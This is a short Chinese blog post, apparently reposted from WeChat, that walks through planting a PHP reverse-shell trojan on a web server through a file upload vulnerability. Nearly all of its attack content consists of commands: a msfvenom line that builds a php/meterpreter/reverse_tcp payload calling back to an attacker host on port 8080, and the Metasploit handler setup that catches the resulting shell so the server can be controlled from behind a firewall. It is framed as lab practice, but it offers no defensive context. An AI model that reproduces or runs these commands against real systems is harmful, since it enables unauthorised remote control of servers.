# 利用文件上传漏洞在Web服务器里种植反射木马

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650744261&idx=1&sn=c4d76d3c344ce2030250ea72d6ec3747&chksm=871484c5b0630dd3c78ec9588d122261ff04418c1751e4fb061df24ad778c43477fc06452c9a&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650744261&idx=1&sn=c4d76d3c344ce2030250ea72d6ec3747&chksm=871484c5b0630dd3c78ec9588d122261ff04418c1751e4fb061df24ad778c43477fc06452c9a&scene=27#wechat_redirect)

Web服务器基本都是藏在防火墙后面的，即使通过漏洞利用拿下了，开了木马端口也访问不进去，本周末实践的是，利用文件上传漏洞在Web服务器里种植反射木马，

在Metasploit下制作木马文件，   
msfvenom -p php/meterpreter/reverse\_tcp LHOST=192.168.128.100 LPORT=8080 -f raw > test.php

把木马文件上传到靶机，

![](../Images/8ac374b605006613ea9ce0d9eeb0620f.png)

在Metasploit下开启一个监听，  
use exploit/multi/handler  
set payload php/meterpreter/reverse\_tcp  
set LHOST 192.168.128.100  
set LPORT 8080  
exploit

从外面访问木马URL，

![](../Images/158560e119e9d4812693964c544735b4.png)

看到反射出来的Meterpreter Shell，

![](../Images/d3cb176237046a398eab6e6f330ffb96.png)

即可控制Web服务器，

![](../Images/e092eccd9ccab4ab8f175e47b2288573.png)
